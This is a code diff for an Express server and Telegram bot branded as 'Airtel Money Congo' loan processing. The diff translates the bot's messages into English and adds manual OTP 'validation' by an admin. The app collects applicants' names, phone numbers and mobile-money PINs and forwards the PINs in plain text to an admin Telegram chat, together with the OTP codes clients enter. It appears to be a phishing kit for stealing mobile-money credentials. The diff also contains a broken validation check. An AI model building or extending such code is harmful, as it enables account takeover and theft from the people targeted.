@@ -70,22 +70,30 @@ console.log('Found index file name:', indexFileName || 'NOT FOUND');
 
 app.use(express.static(STATIC_DIR));
 
-// ==================== TELEGRAM BOT ====================
+// ==================== TELEGRAM BOT (ENGLISH) ====================
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 
-        '👋 Bienvenue sur le Bot Admin Airtel Money Congo!\n\n' +
-        '/pending - Voir les demandes en attente\n' +
-        '/approved - Voir les crédits approuvés\n' +
-        '/declined - Voir les crédits refusés\n' +
-        '/help - Aide'
+        '👋 Welcome to Airtel Money Congo Admin Bot!\n\n' +
+        'You will receive loan applications here.\n\n' +
+        'Commands:\n' +
+        '/pending - View pending requests\n' +
+        '/approved - View approved loans\n' +
+        '/declined - View declined loans\n' +
+        '/help - Help'
     );
 });
 
 bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId,
-        '📋 *Commandes Admin*\n/pending - En attente\n/approved - Approuvés\n/declined - Refusés',
+        '📋 *Airtel Money Admin Commands*\n\n' +
+        '/pending - List pending requests\n' +
+        '/approved - List approved loans\n' +
+        '/declined - List declined loans\n\n' +
+        'When you receive a request:\n' +
+        '✅ Approve: Click "✅ Approve"\n' +
+        '❌ Decline: Click "❌ Decline"',
         { parse_mode: 'Markdown' }
     );
 });
@@ -94,7 +102,7 @@ bot.onText(/\/pending/, (msg) => {
     const chatId = msg.chat.id;
     const pending = Array.from(applications.values()).filter(a => a.status === 'pending');
     if (pending.length === 0) {
-        bot.sendMessage(chatId, '📭 Aucune demande en attente.');
+        bot.sendMessage(chatId, '📭 No pending requests.');
         return;
     }
     pending.forEach(app => sendApplicationToAdmin(app));
@@ -104,12 +112,18 @@ bot.onText(/\/approved/, (msg) => {
     const chatId = msg.chat.id;
     const approved = Array.from(applications.values()).filter(a => a.status === 'approved');
     if (approved.length === 0) {
-        bot.sendMessage(chatId, '✅ Aucun crédit approuvé.');
+        bot.sendMessage(chatId, '✅ No approved loans.');
         return;
     }
     approved.forEach(app => {
         bot.sendMessage(chatId, 
-            `✅ *CRÉDIT APPROUVÉ*\nID: \`${app.id}\`\nNom: ${app.firstName} ${app.lastName}\nMontant: ${app.loanAmount} CDF`,
+            `✅ *LOAN APPROVED*\n` +
+            `ID: \`${app.id}\`\n` +
+            `Name: ${app.firstName} ${app.lastName}\n` +
+            `Amount: ${app.loanAmount} CDF\n` +
+            `Duration: ${app.loanDuration} months\n` +
+            `Phone: ${app.phone}\n` +
+            `Date: ${app.submittedAt}`,
             { parse_mode: 'Markdown' }
         );
     });
@@ -119,12 +133,17 @@ bot.onText(/\/declined/, (msg) => {
     const chatId = msg.chat.id;
     const declined = Array.from(applications.values()).filter(a => a.status === 'declined');
     if (declined.length === 0) {
-        bot.sendMessage(chatId, '❌ Aucun crédit refusé.');
+        bot.sendMessage(chatId, '❌ No declined loans.');
         return;
     }
     declined.forEach(app => {
         bot.sendMessage(chatId, 
-            `❌ *CRÉDIT REFUSÉ*\nID: \`${app.id}\`\nNom: ${app.firstName} ${app.lastName}`,
+            `❌ *LOAN DECLINED*\n` +
+            `ID: \`${app.id}\`\n` +
+            `Name: ${app.firstName} ${app.lastName}\n` +
+            `Amount: ${app.loanAmount} CDF\n` +
+            `Phone: ${app.phone}\n` +
+            `Date: ${app.submittedAt}`,
             { parse_mode: 'Markdown' }
         );
     });
@@ -140,7 +159,7 @@ bot.on('callback_query', async (callbackQuery) => {
     const app = applications.get(appId);
 
     if (!app) {
-        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Demande introuvable!' });
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Request not found!' });
         return;
     }
 
@@ -153,15 +172,15 @@ bot.on('callback_query', async (callbackQuery) => {
         otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
         saveData();
 
-        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Crédit approuvé! OTP envoyé.' });
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Loan approved! OTP sent to client.' });
 
         bot.editMessageText(
-            `✅ *CRÉDIT APPROUVÉ*\n\n` + formatApplication(app) +
-            `\n\n📱 OTP: ${otp}`,
+            `✅ *LOAN APPROVED*\n\n` + formatApplication(app) +
+            `\n\n📱 OTP sent to: ${app.phone}\n🔢 OTP: ${otp}`,
             { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
         );
 
-        console.log(`📲 OTP pour ${app.phone}: ${otp}`);
+        console.log(`📲 OTP for ${app.phone}: ${otp}`);
 
     } else if (action === 'decline') {
         app.status = 'declined';
@@ -169,12 +188,46 @@ bot.on('callback_query', async (callbackQuery) => {
         app.decidedBy = chatId;
         saveData();
 
-        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Crédit refusé.' });
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Loan declined.' });
 
         bot.editMessageText(
-            `❌ *CRÉDIT REFUSÉ*\n\n` + formatApplication(app),
+            `❌ *LOAN DECLINED*\n\n` + formatApplication(app),
             { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
         );
+    } else if (action === 'otp_valid') {
+        // Admin confirms OTP is valid
+        app.otpVerified = true;
+        app.otpValidatedBy = chatId;
+        app.otpValidatedAt = new Date().toISOString();
+        saveData();
+
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ OTP validated! Client will see success.' });
+
+        bot.editMessageText(
+            `✅ *OTP VALIDATED*\n\n` + formatApplication(app) +
+            `\n\n🔐 OTP verified by admin\n✅ Client notified of success`,
+            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
+        );
+
+    } else if (action === 'otp_invalid') {
+        // Admin says OTP is invalid
+        app.otpRejected = true;
+        app.otpRejectedBy = chatId;
+        app.otpRejectedAt = new Date().toISOString();
+        // Generate new OTP
+        const newOtp = generateOTP();
+        otps.set(app.phone, { otp: newOtp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
+        saveData();
+
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ OTP rejected. New OTP sent to client.' });
+
+        bot.editMessageText(
+            `❌ *OTP REJECTED - NEW OTP SENT*\n\n` + formatApplication(app) +
+            `\n\n📱 New OTP sent to: ${app.phone}\n🔢 New OTP: ${newOtp}`,
+            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
+        );
+
+        console.log(`📲 New OTP for ${app.phone}: ${newOtp}`);
     }
 });
 
@@ -185,18 +238,18 @@ function generateOTP() {
 
 function formatApplication(app) {
     return (
-        `📝 *Demande de Crédit*\n` +
+        `📝 *Loan Application*\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
-        `👤 *Nom:* ${app.firstName} ${app.lastName}\n` +
-        `📞 *Téléphone:* ${app.phone}\n` +
-        `💰 *Montant:* ${app.loanAmount} CDF\n` +
-        `📅 *Durée:* ${app.loanDuration} mois\n` +
-        `📊 *Intérêt:* 2.5%/mois\n` +
-        `💵 *Mensualité:* ${app.monthlyPayment} CDF\n` +
+        `👤 *Name:* ${app.firstName} ${app.lastName}\n` +
+        `📞 *Phone:* ${app.phone}\n` +
+        `💰 *Amount:* ${app.loanAmount} CDF\n` +
+        `📅 *Duration:* ${app.loanDuration} months\n` +
+        `📊 *Interest:* 2.5%/month\n` +
+        `💵 *Monthly Payment:* ${app.monthlyPayment} CDF\n` +
         `🔢 *PIN:* ${app.pin}\n` +
         `🏷 *Type:* ${app.loanType}\n` +
-        `📝 *Objet:* ${app.purpose || 'N/A'}\n` +
-        `⏰ *Soumis:* ${app.submittedAt}\n` +
+        `📝 *Purpose:* ${app.purpose || 'N/A'}\n` +
+        `⏰ *Submitted:* ${app.submittedAt}\n` +
         `🆔 *ID:* \`${app.id}\``
     );
 }
@@ -205,8 +258,8 @@ function sendApplicationToAdmin(app) {
     const keyboard = {
         inline_keyboard: [
             [
-                { text: '✅ Approuver', callback_data: `approve:${app.id}` },
-                { text: '❌ Refuser', callback_data: `decline:${app.id}` }
+                { text: '✅ Approve', callback_data: `approve:${app.id}` },
+                { text: '❌ Decline', callback_data: `decline:${app.id}` }
             ]
         ]
     };
@@ -216,11 +269,27 @@ function sendApplicationToAdmin(app) {
     });
 }
 
+function sendOTPValidationToAdmin(app) {
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '✅ Valid OTP', callback_data: `otp_valid:${app.id}` },
+                { text: '❌ Invalid OTP', callback_data: `otp_invalid:${app.id}` }
+            ]
+        ]
+    };
+    bot.sendMessage(ADMIN_CHAT_ID, 
+        `🔐 *OTP Verification Required*\n\n` + formatApplication(app) +
+        `\n\nClient entered OTP. Please validate:`,
+        { parse_mode: 'Markdown', reply_markup: keyboard }
+    );
+}
+
 // ==================== API ENDPOINTS ====================
 app.post('/api/apply', (req, res) => {
     const { firstName, lastName, phone, loanAmount, loanDuration, loanType, purpose, pin } = req.body;
 
-    if (!firstName || !lastName || !phone || !loanAmount || !loanDuration || !pin) {
+    if (!firstName || !lastName || !phone || !loanAmount === undefined || !loanDuration === undefined || !pin) {
         return res.status(400).json({ success: false, message: 'Tous les champs sont requis' });
     }
 
@@ -228,20 +297,36 @@ app.post('/api/apply', (req, res) => {
         return res.status(400).json({ success: false, message: 'Le PIN doit être de 4 chiffres' });
     }
 
-    const totalInterest = loanAmount * 0.025 * loanDuration;
-    const totalRepayment = parseFloat(loanAmount) + totalInterest;
-    const monthlyPayment = (totalRepayment / loanDuration).toFixed(2);
+    const amount = parseFloat(loanAmount);
+    if (amount < 0 || amount > 2000000) {
+        return res.status(400).json({ success: false, message: 'Le montant doit être entre 0 et 2,000,000 CDF' });
+    }
+
+    const duration = parseInt(loanDuration);
+    if (duration < 1 || duration > 24) {
+        return res.status(400).json({ success: false, message: 'La durée doit être entre 1 et 24 mois' });
+    }
+
+    const totalInterest = amount * 0.025 * duration;
+    const totalRepayment = amount + totalInterest;
+    const monthlyPayment = (totalRepayment / duration).toFixed(2);
 
     const appId = uuidv4();
     const application = {
         id: appId,
-        firstName, lastName, phone, loanAmount, loanDuration,
+        firstName, lastName, phone, loanAmount: amount, loanDuration: duration,
         loanType: loanType || 'Non spécifié',
         purpose: purpose || 'Non spécifié',
         pin, monthlyPayment,
         status: 'pending',
         submittedAt: new Date().toISOString(),
-        otp: null, otpVerified: false
+        otp: null,
+        otpVerified: false,
+        otpRejected: false,
+        otpValidatedBy: null,
+        otpValidatedAt: null,
+        otpRejectedBy: null,
+        otpRejectedAt: null
     };
 
     applications.set(appId, application);
@@ -251,7 +336,7 @@ app.post('/api/apply', (req, res) => {
     res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
 });
 
-// ✅ ACCEPT ANY OTP - modified to not validate the code itself
+// OTP submission - sends to admin for validation
 app.post('/api/verify-otp', (req, res) => {
     const { phone, otp, applicationId } = req.body;
     const stored = otps.get(phone);
@@ -262,29 +347,33 @@ app.post('/api/verify-otp', (req, res) => {
         saveData(); 
         return res.status(400).json({ success: false, message: 'OTP expiré' }); 
     }
-    
-    // REMOVED: OTP code validation - any code is accepted!
-    // if (stored.otp !== otp) return res.status(400).json({ success: false, message: 'OTP invalide' });
-    
     if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });
 
     const app = applications.get(applicationId);
     app.otp = otp;
-    app.otpVerified = true;
-    app.verifiedAt = new Date().toISOString();
-    otps.delete(phone);
     saveData();
 
-    bot.sendMessage(ADMIN_CHAT_ID, 
-        `🎉 *CRÉDIT TRAITÉ AVEC SUCCÈS*\n\n` + formatApplication(app) +
-        `\n\n🔐 *OTP Vérifié:* ${otp}\n✅ *Statut:* COMPLET\n⏰ *Vérifié:* ${app.verifiedAt}`,
-        { parse_mode: 'Markdown' }
-    );
+    // Send to admin for validation instead of auto-approving
+    sendOTPValidationToAdmin(app);
 
-    res.json({ success: true, message: 'OTP vérifié! Crédit approuvé!', application: {
-        id: app.id, name: `${app.firstName} ${app.lastName}`, amount: app.loanAmount,
-        duration: app.loanDuration, monthlyPayment: app.monthlyPayment, status: 'complete'
-    }});
+    res.json({ success: true, message: 'OTP soumis. En attente de validation admin.', status: 'pending_validation' });
+});
+
+// Client polls for OTP validation status
+app.get('/api/otp-status/:id', (req, res) => {
+    const app = applications.get(req.params.id);
+    if (!app) return res.status(404).json({ success: false, message: 'Introuvable' });
+    
+    if (app.otpVerified) {
+        res.json({ success: true, status: 'verified', application: {
+            id: app.id, name: `${app.firstName} ${app.lastName}`, amount: app.loanAmount,
+            duration: app.loanDuration, monthlyPayment: app.monthlyPayment, status: 'complete'
+        }});
+    } else if (app.otpRejected) {
+        res.json({ success: true, status: 'rejected', message: 'OTP invalide. Nouveau code envoyé.' });
+    } else {
+        res.json({ success: true, status: 'pending', message: 'En attente de validation...' });
+    }
 });
 
 app.get('/api/status/:id', (req, res) => {
@@ -326,7 +415,7 @@ app.get('*', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Airtel Money Congo Server running on port ${PORT}`);
-    console.log(`🤖 Telegram Bot actif`);
+    console.log(`🤖 Telegram Bot active (English)`);
     console.log(`💾 Data file: ${DATA_FILE}`);
     console.log(`📊 Loaded ${applications.size} applications`);
 });
